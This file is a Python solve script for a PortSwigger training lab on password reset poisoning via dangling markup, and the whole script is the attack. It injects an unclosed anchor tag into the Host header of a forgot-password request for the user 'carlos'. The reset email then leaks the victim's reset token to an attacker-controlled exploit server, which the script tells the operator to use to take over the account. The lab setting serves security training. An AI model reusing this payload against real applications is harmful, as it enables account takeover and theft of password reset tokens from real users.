#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Password reset poisoning via dangling markup.

The password reset email reflects the Host header in HTML unescaped.
Injecting an unclosed <a href="//exploit-server? into the Host causes the
email client to exfiltrate the reset token to the exploit server.

Steps:
  1. Send poisoned reset request for carlos.
  2. Carlos's email client renders the HTML and fetches the exploit server URL.
  3. Token appears in the exploit server access log.
  4. Use the token to reset carlos's password.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def poison_reset(lab, lab_host, exploit_host, username="carlos"):
    # Dangling markup payload: opens an <a href> that captures the token
    malicious_host = f"{lab_host}:'<a href=\"//{exploit_host}?"

    r = requests.post(
        f"{lab}/forgot-password",
        headers={"Host": malicious_host},
        data={"username": username},
        verify=False,
        allow_redirects=True,
    )
    print(f"[*] Poisoned reset sent for '{username}'")
    print(f"[*] Status: {r.status_code}")
    print(f"\n[!] Check exploit server access log for:")
    print(f"    GET /?/forgot-password?temp-forgot-password-token=<TOKEN>")
    print(f"\n[!] Then visit:")
    print(f"    {lab}/forgot-password?temp-forgot-password-token=<TOKEN>")
    print(f"    to set a new password for {username}.")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Password Reset Poisoning via Dangling Markup lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("lab_host", help="Lab hostname (without https://)")
    parser.add_argument("exploit_host", help="Exploit server hostname (without https://)")
    parser.add_argument("--username", default="carlos")
    args = parser.parse_args()

    poison_reset(args.lab_url.rstrip("/"), args.lab_host, args.exploit_host, args.username)


if __name__ == "__main__":
    main()
